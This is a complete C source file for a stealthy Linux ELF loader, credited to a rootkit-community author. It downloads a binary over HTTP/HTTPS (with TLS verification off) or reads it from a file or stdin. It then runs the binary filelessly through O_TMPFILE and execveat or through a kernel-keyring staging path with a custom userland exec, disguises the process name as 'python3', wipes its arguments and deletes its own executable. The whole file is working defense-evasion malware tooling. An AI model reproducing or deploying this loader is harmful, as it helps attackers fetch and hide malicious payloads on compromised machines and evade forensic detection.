/*
@MatheuzSecurity
discord.gg/rootkits

Join :)
*/

#define _GNU_SOURCE
#include <elf.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <limits.h>
#include <errno.h>

#ifndef KEY_SPEC_SESSION_KEYRING
#define KEY_SPEC_SESSION_KEYRING (-3)
#endif
#define KEYCTL_READ    11
#define KEYCTL_REVOKE   3

#ifdef USE_HTTPS
#include <openssl/ssl.h>
#include <openssl/err.h>
#endif

static int sc_open(const char *path, int flags, int mode)
{
    return (int)syscall(SYS_open, path, flags, mode);
}

static ssize_t sc_read(int fd, void *buf, size_t n)
{
    return (ssize_t)syscall(SYS_read, fd, buf, n);
}

static ssize_t sc_write(int fd, const void *buf, size_t n)
{
    return (ssize_t)syscall(SYS_write, fd, buf, n);
}

static int sc_close(int fd)
{
    return (int)syscall(SYS_close, fd);
}

static int sc_unlink(const char *path)
{
    return (int)syscall(SYS_unlink, path);
}

static int sc_execveat(int fd, const char *path,
                       char *const argv[], char *const envp[], int flags)
{
    return (int)syscall(SYS_execveat, fd, path, argv, envp, flags);
}

typedef struct { uint8_t *data; size_t size; size_t cap; } Buf;

static void buf_append(Buf *b, const void *src, size_t n)
{
    if (b->size + n > b->cap) {
        size_t newcap = b->cap ? b->cap * 2 : 4 * 1024 * 1024;
        while (newcap < b->size + n) newcap *= 2;
        b->data = realloc(b->data, newcap);
        if (!b->data) { sc_write(2, "[-] realloc\n", 12); exit(1); }
        b->cap = newcap;
    }
    memcpy(b->data + b->size, src, n);
    b->size += n;
}

static int magic_ok(const uint8_t *hdr, size_t len)
{
    return len >= 4 &&
           hdr[0] == 0x7f && hdr[1] == 'E' &&
           hdr[2] == 'L'  && hdr[3] == 'F';
}

static const char *anon_dirs[] = { "/tmp", "/var/tmp", "/run", NULL };

static int open_anon_fd(void)
{
    for (int i = 0; anon_dirs[i]; i++) {
        int fd = sc_open(anon_dirs[i], O_TMPFILE | O_RDWR | O_CLOEXEC, 0700);
        if (fd >= 0) return fd;
    }
    sc_write(2, "[-] no writable tmpfs\n", 22);
    return -1;
}

static int write_all(int fd, const void *buf, size_t len)
{
    const uint8_t *p = buf;
    size_t rem = len;
    while (rem > 0) {
        ssize_t r = sc_write(fd, p, rem);
        if (r <= 0) return -1;
        p += r; rem -= r;
    }
    return 0;
}

static int load_from_file(Buf *b, const char *path)
{
    int src = sc_open(path, O_RDONLY, 0);
    if (src < 0) { perror("open"); return -1; }
    uint8_t tmp[65536]; ssize_t r; int first = 1;
    while ((r = sc_read(src, tmp, sizeof(tmp))) > 0) {
        if (first) {
            if (!magic_ok(tmp, r)) { sc_write(2, "[-] not ELF\n", 12); sc_close(src); return -1; }
            first = 0;
        }
        buf_append(b, tmp, r);
    }
    sc_close(src);
    return 0;
}

static int load_from_stdin(Buf *b)
{
    uint8_t tmp[65536]; ssize_t r; int first = 1;
    while ((r = sc_read(0, tmp, sizeof(tmp))) > 0) {
        if (first) {
            if (!magic_ok(tmp, r)) { sc_write(2, "[-] not ELF\n", 12); return -1; }
            first = 0;
        }
        buf_append(b, tmp, r);
    }
    return 0;
}

static int parse_url(const char *url, char *host, size_t hsz,
                     char *path, size_t psz, uint16_t *port, int *tls)
{
    const char *p;
    if (strncmp(url, "https://", 8) == 0) { *tls = 1; *port = 443; p = url + 8; }
    else if (strncmp(url, "http://", 7) == 0) { *tls = 0; *port = 80; p = url + 7; }
    else { sc_write(2, "[-] only http:// or https://\n", 29); return -1; }

    const char *slash = strchr(p, '/');
    size_t hlen = slash ? (size_t)(slash - p) : strlen(p);
    if (hlen >= hsz) return -1;
    memcpy(host, p, hlen); host[hlen] = 0;

    char *colon = strchr(host, ':');
    if (colon) { *port = (uint16_t)atoi(colon + 1); *colon = 0; }

    strncpy(path, slash ? slash : "/", psz - 1);
    return 0;
}

static int tcp_connect(const char *host, uint16_t port)
{
    struct addrinfo hints = {0}, *res = NULL;
    char ps[8]; snprintf(ps, sizeof(ps), "%u", port);
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, ps, &hints, &res) != 0) {
        sc_write(2, "[-] DNS failed\n", 15); return -1;
    }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { freeaddrinfo(res); return -1; }
    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        perror("connect"); sc_close(sock); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);
    return sock;
}

static int drain_to_buf(Buf *b,
                        ssize_t (*readfn)(void *, uint8_t *, size_t),
                        void *ctx)
{
    uint8_t tmp[65536];
    uint8_t hdrbuf[8192]; size_t hdrlen = 0;
    int in_hdr = 1, first = 1;
    ssize_t r;

    while ((r = readfn(ctx, tmp, sizeof(tmp))) > 0) {
        if (in_hdr) {
            size_t copy = (size_t)r;
            if (hdrlen + copy > sizeof(hdrbuf)) copy = sizeof(hdrbuf) - hdrlen;
            memcpy(hdrbuf + hdrlen, tmp, copy);
            hdrlen += copy;
            char *sep = memmem(hdrbuf, hdrlen, "\r\n\r\n", 4);
            if (sep) {
                in_hdr = 0;
                if (strncmp((char *)hdrbuf, "HTTP/", 5) == 0 &&
                    atoi((char *)hdrbuf + 9) != 200) {
                    sc_write(2, "[-] HTTP error\n", 15); return -1;
                }
                uint8_t *body = (uint8_t *)(sep + 4);
                size_t blen  = hdrlen - (size_t)(body - hdrbuf);
                size_t extra = (size_t)r - copy;
                if (blen > 0) {
                    if (first) { if (!magic_ok(body, blen)) { sc_write(2, "[-] not ELF\n", 12); return -1; } first = 0; }
                    buf_append(b, body, blen);
                }
                if (extra > 0) {
                    uint8_t *e = tmp + copy;
                    if (first) { if (!magic_ok(e, extra)) { sc_write(2, "[-] not ELF\n", 12); return -1; } first = 0; }
                    buf_append(b, e, extra);
                }
            }
        } else {
            if (first) { if (!magic_ok(tmp, r)) { sc_write(2, "[-] not ELF\n", 12); return -1; } first = 0; }
            buf_append(b, tmp, r);
        }
    }
    return 0;
}

static ssize_t plain_read(void *ctx, uint8_t *buf, size_t n)
{
    return sc_read(*(int *)ctx, buf, n);
}

#ifdef USE_HTTPS
static ssize_t ssl_read(void *ctx, uint8_t *buf, size_t n)
{
    return (ssize_t)SSL_read((SSL *)ctx, buf, (int)n);
}
#endif

static int load_from_http(Buf *b, const char *url)
{
    char host[256], path[4096];
    uint16_t port; int tls;
    if (parse_url(url, host, sizeof(host), path, sizeof(path), &port, &tls) < 0)
        return -1;

#ifndef USE_HTTPS
    if (tls) { sc_write(2, "https not supported\n", 20); return -1; }
#endif

    int sock = tcp_connect(host, port);
    if (sock < 0) return -1;

    int use_post = (strstr(host, "temp.sh") != NULL); //I was doing a test in temp.sh so i put it in the post method
    char req[8192];
    int rlen;
    if (use_post)
        rlen = snprintf(req, sizeof(req),
            "POST %s HTTP/1.0\r\nHost: %s\r\nContent-Length: 0\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Connection: close\r\n\r\n", path, host);
    else
        rlen = snprintf(req, sizeof(req),
            "GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n",
            path, host);

    int rc = -1;

#ifdef USE_HTTPS
    if (tls) {
        SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) { sc_close(sock); return -1; }
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        SSL_set_tlsext_host_name(ssl, host);
        if (SSL_connect(ssl) != 1) {
            ERR_print_errors_fp(stderr);
            SSL_free(ssl); SSL_CTX_free(ctx); sc_close(sock); return -1;
        }
        SSL_write(ssl, req, rlen);
        rc = drain_to_buf(b, ssl_read, ssl);
        SSL_shutdown(ssl); SSL_free(ssl); SSL_CTX_free(ctx);
    } else {
#endif
        sc_write(sock, req, rlen);
        rc = drain_to_buf(b, plain_read, &sock);
#ifdef USE_HTTPS
    }
#endif

    sc_close(sock);
    return rc;
}

static void exec_anon(const Buf *payload, char *const argv[],
                      char *const envp[], const char *spoof_name,
                      int orig_argc, char **orig_argv)
{
    int anon_fd = open_anon_fd();
    if (anon_fd < 0) exit(1);

    if (write_all(anon_fd, payload->data, payload->size) < 0) {
        perror("write anon"); exit(1);
    }

    char fdpath[64];
    snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", anon_fd);
    int ro_fd = sc_open(fdpath, O_RDONLY | O_CLOEXEC, 0);
    if (ro_fd < 0) { perror("reopen ro"); exit(1); }
    sc_close(anon_fd);

    if (spoof_name) {
        prctl(PR_SET_NAME, spoof_name, 0, 0, 0);

        if (orig_argc >= 1 && orig_argv[0]) {
            char *start = orig_argv[0];
            char *end   = orig_argv[orig_argc - 1] + strlen(orig_argv[orig_argc - 1]) + 1;
            size_t total = (size_t)(end - start);
            memset(start, 0, total);
            strncpy(start, spoof_name, total - 1);
        }
    }

    char self_path[PATH_MAX] = {0};
    ssize_t n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (n > 0) sc_unlink(self_path);

    sc_execveat(ro_fd, "", argv, envp, AT_EMPTY_PATH);
    perror("execveat");
    exit(1);
}

static long keyring_store(const Buf *b)
{
    long key = syscall(248,
                       "user", "_dntry",
                       b->data, (long)b->size,
                       (long)KEY_SPEC_SESSION_KEYRING);
    if (key < 0) { perror("add_key"); return -1; }
    return key;
}

static long keyring_store_big(const Buf *b)
{
    if (b->size > 1048576) {
        sc_write(2, "[-] big_key max is 1 MiB; payload too large\n", 44);
        return -1;
    }
    long key = syscall(248,
                       "big_key", "_dntry",
                       b->data, (long)b->size,
                       (long)KEY_SPEC_SESSION_KEYRING);
    if (key < 0) {
        if (errno == ENODEV)
            sc_write(2, "[-] big_key not supported (CONFIG_BIG_KEYS not set)\n", 52);
        else if (errno == EINVAL)
            sc_write(2, "[-] big_key: EINVAL (payload > 1 MiB or no tmpfs for staging)\n", 62);
        else
            perror("add_key big_key");
        return -1;
    }
    return key;
}

static int keyring_load(long key_id, Buf *out)
{
    long sz = syscall(250,
                      (long)KEYCTL_READ, key_id, 0L, 0L);
    if (sz < 0) { perror("keyctl read-size"); return -1; }

    out->data = mmap(NULL, (size_t)sz, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (out->data == MAP_FAILED) { perror("mmap keyring buf"); return -1; }
    out->size = (size_t)sz;
    out->cap  = (size_t)sz;

    long r = syscall(250, (long)KEYCTL_READ, key_id, (long)out->data, sz);
    if (r < 0) { perror("keyctl read"); munmap(out->data, sz); return -1; }

    syscall(250, (long)KEYCTL_REVOKE, key_id, 0L, 0L);
    return 0;
}

#define PAGE_SIZE 4096UL
#define PAGE_DOWN(x) ((x) & ~(PAGE_SIZE - 1))
#define PAGE_UP(x)   (((x) + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1))

typedef struct {
    uintptr_t entry;
    uintptr_t phdr_va;
    uint16_t  phnum;
    uint16_t  phentsz;
} ElfInfo;

static int elf_load(const uint8_t *buf, size_t sz, ElfInfo *out)
{
    if (sz < sizeof(Elf64_Ehdr)) return -1;

    Elf64_Ehdr *eh = (Elf64_Ehdr *)buf;
    if (memcmp(eh->e_ident, "\x7f""ELF", 4))   return -1;
    if (eh->e_ident[EI_CLASS] != ELFCLASS64)    return -1;
    if (eh->e_machine          != EM_X86_64)    return -1;
    if (eh->e_type != ET_EXEC && eh->e_type != ET_DYN) {
        sc_write(2, "[-] only ET_EXEC or ET_DYN\n", 27); return -1;
    }

    int is_pie = (eh->e_type == ET_DYN);
    uintptr_t load_bias = 0;
    Elf64_Phdr *ph = (Elf64_Phdr *)(buf + eh->e_phoff);

    if (is_pie) {
        uintptr_t lo = UINTPTR_MAX, hi = 0;
        for (int i = 0; i < eh->e_phnum; i++) {
            if (ph[i].p_type != PT_LOAD) continue;
            if (ph[i].p_vaddr < lo) lo = ph[i].p_vaddr;
            uintptr_t end = ph[i].p_vaddr + ph[i].p_memsz;
            if (end > hi) hi = end;
        }
        size_t total = PAGE_UP(hi) - PAGE_DOWN(lo);
        void *hint = mmap(NULL, total, PROT_NONE,
                          MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if (hint == MAP_FAILED) return -1;
        munmap(hint, total);
        load_bias = (uintptr_t)hint - PAGE_DOWN(lo);
    }

    for (int i = 0; i < eh->e_phnum; i++) {
        if (ph[i].p_type != PT_LOAD) continue;

        int prot = 0;
        if (ph[i].p_flags & PF_R) prot |= PROT_READ;
        if (ph[i].p_flags & PF_W) prot |= PROT_WRITE;
        if (ph[i].p_flags & PF_X) prot |= PROT_EXEC;

        uintptr_t seg_va  = PAGE_DOWN(ph[i].p_vaddr + load_bias);
        size_t    seg_len = PAGE_UP(ph[i].p_vaddr + load_bias + ph[i].p_memsz) - seg_va;

        void *seg = mmap((void *)seg_va, seg_len,
                         PROT_READ|PROT_WRITE,
                         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);
        if (seg == MAP_FAILED || seg != (void *)seg_va) {
            sc_write(2, "[-] segment mmap failed: address conflict\n"
                        "    build loader as PIE: gcc -fPIE -pie\n", 81);
            return -1;
        }

        uintptr_t dst = ph[i].p_vaddr + load_bias;
        if (ph[i].p_offset + ph[i].p_filesz > sz) return -1;
        memcpy((void *)dst, buf + ph[i].p_offset, ph[i].p_filesz);

        if (ph[i].p_memsz > ph[i].p_filesz)
            memset((void *)(dst + ph[i].p_filesz), 0,
                   ph[i].p_memsz - ph[i].p_filesz);

        mprotect((void *)seg_va, seg_len, prot);
    }

    uintptr_t phdr_va = 0;
    for (int i = 0; i < eh->e_phnum; i++) {
        if (ph[i].p_type == PT_PHDR) { phdr_va = ph[i].p_vaddr + load_bias; break; }
    }

    out->entry   = eh->e_entry + load_bias;
    out->phdr_va = phdr_va;
    out->phnum   = eh->e_phnum;
    out->phentsz = eh->e_phentsize;
    return 0;
}

static uintptr_t build_stack(void *stk_top, int argc, char **argv, char **envp,
                              const ElfInfo *ei)
{
    int envc = 0;
    while (envp[envc]) envc++;

    uintptr_t sp = (uintptr_t)stk_top;

    char *new_argv[256], *new_envp[1024];
    for (int i = argc - 1; i >= 0; i--) {
        size_t l = strlen(argv[i]) + 1;
        sp -= l; memcpy((void *)sp, argv[i], l);
        new_argv[i] = (char *)sp;
    }
    for (int i = envc - 1; i >= 0; i--) {
        size_t l = strlen(envp[i]) + 1;
        sp -= l; memcpy((void *)sp, envp[i], l);
        new_envp[i] = (char *)sp;
    }

    sp &= ~15UL;

    sp -= 16;
    uintptr_t at_random_addr = sp;
    {
        int rfd = open("/dev/urandom", O_RDONLY);
        if (rfd >= 0) { read(rfd, (void *)sp, 16); close(rfd); }
    }

    sp &= ~15UL;

    if ((17 + argc + envc) % 2 != 0)
        sp -= 8;

#define AUX(t, v) do {                                    \
    sp -= 8; *(uintptr_t *)sp = (uintptr_t)(v);           \
    sp -= 8; *(uintptr_t *)sp = (uintptr_t)(t); } while(0)

    AUX(AT_NULL,   0);
    AUX(AT_RANDOM, at_random_addr);
    AUX(AT_PAGESZ, PAGE_SIZE);
    AUX(AT_ENTRY,  ei->entry);
    AUX(AT_PHENT,  ei->phentsz);
    AUX(AT_PHNUM,  ei->phnum);
    AUX(AT_PHDR,   ei->phdr_va);
#undef AUX

    sp -= 8; *(uintptr_t *)sp = 0;
    for (int i = envc - 1; i >= 0; i--) { sp -= 8; *(uintptr_t *)sp = (uintptr_t)new_envp[i]; }

    sp -= 8; *(uintptr_t *)sp = 0;
    for (int i = argc - 1; i >= 0; i--) { sp -= 8; *(uintptr_t *)sp = (uintptr_t)new_argv[i]; }

    sp -= 8; *(uintptr_t *)sp = (uintptr_t)argc;

    return sp;
}

static __attribute__((noreturn)) void enter(uintptr_t entry, uintptr_t sp)
{
    register uintptr_t r_entry __asm__("rdi") = entry;
    register uintptr_t r_sp    __asm__("rsi") = sp;
    __asm__ volatile(
        "mov  %%rsi, %%rsp\n\t"
        "xor  %%eax, %%eax\n\t"
        "xor  %%ebx, %%ebx\n\t"
        "xor  %%ecx, %%ecx\n\t"
        "xor  %%edx, %%edx\n\t"
        "xor  %%esi, %%esi\n\t"
        "xor  %%ebp, %%ebp\n\t"
        "xor  %%r8d, %%r8d\n\t"
        "xor  %%r9d, %%r9d\n\t"
        "xor  %%r10d, %%r10d\n\t"
        "xor  %%r11d, %%r11d\n\t"
        "xor  %%r12d, %%r12d\n\t"
        "xor  %%r13d, %%r13d\n\t"
        "xor  %%r14d, %%r14d\n\t"
        "xor  %%r15d, %%r15d\n\t"
        "jmp  *%%rdi"
        :
        : "r"(r_entry), "r"(r_sp)
        : "memory"
    );
    __builtin_unreachable();
}

static void uexec(const Buf *payload, int argc, char **argv, char **envp,
                  const char *spoof_name, int orig_argc, char **orig_argv)
{
    ElfInfo ei = {0};
    if (elf_load(payload->data, payload->size, &ei) < 0) exit(1);

    size_t stk_sz = 8 * 1024 * 1024;
    void *stk = mmap(NULL, stk_sz, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (stk == MAP_FAILED) { perror("stack mmap"); exit(1); }

    if (spoof_name) {
        char name_copy[16] = {0};
        strncpy(name_copy, spoof_name, sizeof(name_copy) - 1);
        prctl(PR_SET_NAME, name_copy, 0, 0, 0);
        if (orig_argc >= 1 && orig_argv[0]) {
            char *start = orig_argv[0];
            char *end   = orig_argv[orig_argc - 1] + strlen(orig_argv[orig_argc - 1]) + 1;
            size_t total = (size_t)(end - start);
            memset(start, 0, total);
            strncpy(start, name_copy, total - 1);
        }
    }

    char self_path[PATH_MAX] = {0};
    ssize_t n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (n > 0) sc_unlink(self_path);

    uintptr_t sp = build_stack((uint8_t *)stk + stk_sz, argc, argv, envp, &ei);
    enter(ei.entry, sp);
}

static void usage(const char *me)
{
    dprintf(2,
        "Usage:\n"
        "  %s file   <elf> [spoof_name] [args...]  - O_TMPFILE + execveat\n"
        "  %s http   <url> [spoof_name]             - O_TMPFILE + execveat via HTTP\n"
        "  %s stdin  [spoof_name]                   - O_TMPFILE + execveat via stdin\n"
        "  %s kfile  <elf> [spoof_name]             - keyring (user, 20KB) + userland exec\n"
        "  %s khttp  <url> [spoof_name]             - keyring (user, 20KB) + userland exec via HTTP\n"
        "  %s kstdin [spoof_name]                   - keyring (user, 20KB) + userland exec via stdin\n"
        "  %s bkfile  <elf> [spoof_name]            - keyring (big_key, 1MiB) + userland exec\n"
        "  %s bkhttp  <url> [spoof_name]            - keyring (big_key, 1MiB) + userland exec via HTTP\n"
        "  %s bkstdin [spoof_name]                  - keyring (big_key, 1MiB) + userland exec via stdin\n"
        "\nspoof_name: argv[0] of loaded process (default: python3)\n"
        "big_key requires CONFIG_BIG_KEYS=y (default on Ubuntu Server, RHEL 8/9)\n",
        me, me, me, me, me, me, me, me, me);
    exit(1);
}

extern char **environ;

int main(int argc, char *argv[])
{
    if (argc < 2) usage(argv[0]);

    const char *mode = argv[1];
    Buf payload = {0};
    int rc = -1;

    if (strcmp(mode, "file") == 0 || strcmp(mode, "stdin") == 0 ||
        strcmp(mode, "http") == 0) {

        if (strcmp(mode, "file") == 0) {
            if (argc < 3) usage(argv[0]);
            rc = load_from_file(&payload, argv[2]);
        } else if (strcmp(mode, "http") == 0) {
            if (argc < 3) usage(argv[0]);
            rc = load_from_http(&payload, argv[2]);
        } else {
            rc = load_from_stdin(&payload);
        }

        if (rc == 0) {
            int spoof_idx = (strcmp(mode, "stdin") == 0) ? 2 : 3;
            char *spoof = strdup(argc > spoof_idx ? argv[spoof_idx] : "python3");
            int nargs = (strcmp(mode, "file") == 0 && argc > 4) ? argc - 4 : 0;
            char **ea = calloc(nargs + 2, sizeof(char *));
            ea[0] = spoof;
            for (int i = 0; i < nargs; i++) ea[i + 1] = argv[4 + i];
            exec_anon(&payload, ea, environ, spoof, argc, argv);
        }

    } else if (strcmp(mode, "kfile") == 0 || strcmp(mode, "khttp") == 0 ||
               strcmp(mode, "kstdin") == 0) {

        if (strcmp(mode, "kfile") == 0) {
            if (argc < 3) usage(argv[0]);
            rc = load_from_file(&payload, argv[2]);
        } else if (strcmp(mode, "khttp") == 0) {
            if (argc < 3) usage(argv[0]);
            rc = load_from_http(&payload, argv[2]);
        } else {
            rc = load_from_stdin(&payload);
        }

        if (rc == 0) {
            int spoof_idx = (strcmp(mode, "kstdin") == 0) ? 2 : 3;
            char *spoof = strdup(argc > spoof_idx ? argv[spoof_idx] : "python3");

            long key_id = keyring_store(&payload);
            free(payload.data); payload.data = NULL; payload.size = 0;
            if (key_id < 0) return 1;

            Buf from_key = {0};
            if (keyring_load(key_id, &from_key) < 0) return 1;

            char *ea[] = {spoof, NULL};
            uexec(&from_key, 1, ea, environ, spoof, argc, argv);
        }

    } else if (strcmp(mode, "bkfile") == 0 || strcmp(mode, "bkhttp") == 0 ||
               strcmp(mode, "bkstdin") == 0) {

        if (strcmp(mode, "bkfile") == 0) {
            if (argc < 3) usage(argv[0]);
            rc = load_from_file(&payload, argv[2]);
        } else if (strcmp(mode, "bkhttp") == 0) {
            if (argc < 3) usage(argv[0]);
            rc = load_from_http(&payload, argv[2]);
        } else {
            rc = load_from_stdin(&payload);
        }

        if (rc == 0) {
            int spoof_idx = (strcmp(mode, "bkstdin") == 0) ? 2 : 3;
            char *spoof = strdup(argc > spoof_idx ? argv[spoof_idx] : "python3");

            long key_id = keyring_store_big(&payload);
            free(payload.data); payload.data = NULL; payload.size = 0;
            if (key_id < 0) return 1;

            Buf from_key = {0};
            if (keyring_load(key_id, &from_key) < 0) return 1;

            char *ea[] = {spoof, NULL};
            uexec(&from_key, 1, ea, environ, spoof, argc, argv);
        }

    } else {
        usage(argv[0]);
    }

    free(payload.data);
    return rc == 0 ? 0 : 1;
}
